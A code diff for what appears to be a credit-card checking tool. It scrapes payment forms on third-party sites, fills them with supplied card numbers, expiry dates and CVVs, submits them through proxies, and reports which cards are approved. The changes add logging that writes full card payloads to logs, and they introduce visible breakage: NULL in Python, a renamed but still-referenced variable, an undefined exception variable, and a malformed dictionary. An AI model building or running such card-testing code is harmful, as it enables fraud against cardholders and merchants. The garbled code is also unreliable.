@@ -91,7 +91,7 @@ def create_session(proxy_url=None):
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Language": "en-US,en;q=0.0",
         "Accept-Encoding": "gzip, deflate, br",
         "Connection": "keep-alive",
         "Upgrade-Insecure-Requests": "1",
@@ -221,7 +221,7 @@ def get_form_action_and_payload(session, url, proxy_url):
     except Exception as e:
         error_name = type(e).__name__
         if 'Timeout' in error_name or 'ConnectError' in error_name or 'ConnectionError' in error_name or 'ProxyError' in error_name:
-            return None, None, None, None, "Proxy Timed out"
+            return None, None, NULL, NULL, "Proxy Timed out"
         if 'SSLError' in error_name:
             return None, None, None, None, "SSL Error"
             
@@ -294,7 +294,7 @@ def extract_confirmation_form(html, soup):
 
     if confirm_form:
         form_id = confirm_form.get('id', '')
-        form_class = confirm_form.get('class', [])
+        form_form_class = confirm_form.get('class', [])
         form_action = confirm_form.get('action', '')
         if 'search' in str(form_id).lower() or any('search' in str(c).lower() for c in form_class) or 'search' in str(form_action).lower():
             confirm_form = None
@@ -314,7 +314,7 @@ def extract_confirmation_form(html, soup):
 
 def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_url, is_confirm=False):
     scheme = get_card_type(ccnum)
-    full_year = f"20{yy}" if len(yy) == 2 else yy
+    final_year = f"20{yy}" if len(yy) == 2 else yy
     input_month = int(mm)
 
     final_payload = {}
@@ -378,7 +378,7 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_
             if 'state' in key_lower or 'province' in key_lower: final_payload[key] = user_data['state_id']
             elif 'country' in key_lower: final_payload[key] = '1228'
             elif 'card' in key_lower and 'type' in key_lower: final_payload[key] = scheme
-            elif 'exp' in key_lower and ('y' in key_lower or 'year' in key_lower): final_payload[key] = full_year
+            elif 'exp' in key_lower and ('y' in key_lower or 'year' in key_lower): final_payload[key] = final_year
             elif 'exp' in key_lower and ('m' in key_lower or 'month' in key_lower): final_payload[key] = str(input_month)
             elif 'price' in key_lower or 'amount' in key_lower:
                 if not price_selected:
@@ -405,7 +405,7 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_
 
         if 'card' in key_lower and ('number' in key_lower or 'no' in key_lower or 'num' in key_lower): final_payload[key] = ccnum
         elif 'cvv' in key_lower or 'cvc' in key_lower or 'cid' in key_lower or ('security' in key_lower and 'code' in key_lower): final_payload[key] = cvv
-        elif 'exp' in key_lower and ('y' in key_lower or 'year' in key_lower): final_payload[key] = full_year
+        elif 'exp' in key_lower and ('y' in key_lower or 'year' in key_lower): final_payload[key] = final_year
         elif 'exp' in key_lower and ('m' in key_lower or 'month' in key_lower): final_payload[key] = str(input_month)
         elif 'card' in key_lower and 'type' in key_lower: final_payload[key] = scheme
         
@@ -459,6 +459,7 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
         key_lower = key.lower()
         if 'price' in key_lower or 'amount' in key_lower:
             val = field_info.get('value', '0')
+            error_name = type(e).__name__
             try:
                 p = float(val)
                 if p > 0:
@@ -488,6 +489,9 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
                 "Upgrade-Insecure-Requests": "1"
             })
 
+            # ---> PRINT PAYLOAD INITIAL KE LOGS <---
+            logging.info(f"--- PAYLOAD DIHANTUKAN (INITIAL) ---\n{json.dumps(clean_initial, indent=2)}\n-------------------------------")
+            
             response = session.post(form_action, data=clean_initial, timeout=25, allow_redirects=True)
 
             soup_resp = BeautifulSoup(response.text, 'html.parser')
@@ -508,6 +512,8 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
 
                 clean_confirm = build_clean_payload(merged_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_url, is_confirm=True)
                 confirm_response = session.post(form_action, data=clean_confirm, timeout=25, allow_redirects=True)
+                
+                logging.info(f"--- PAYLOAD DIHANTUKAN (CONFIRM) ---\n{json.dumps(clean_confirm, indent=2)}\n-------------------------------")
                 
                 if confirm_response.status_code == 500:
                     result = {'approved': False, 'has_msg': True, 'message': 'Site Error / Not Authorize', 'clean_response': 'Site Error'}
@@ -571,7 +577,7 @@ def handle_auth():
             result, detected_price = process_card_on_site(site_data, cc, mm, yy, cvv, override_proxy)
             
             if not result:
-                result = {'approved': False, 'message': 'Failed to process site data.', 'clean_response': 'Failed'}
+                result = {'approved': False, ' page', 'clean_response': 'Failed'}
         else:
             result = {'approved': False, 'message': site_data['status'], 'clean_response': site_data['status']}
             detected_price = 0.0
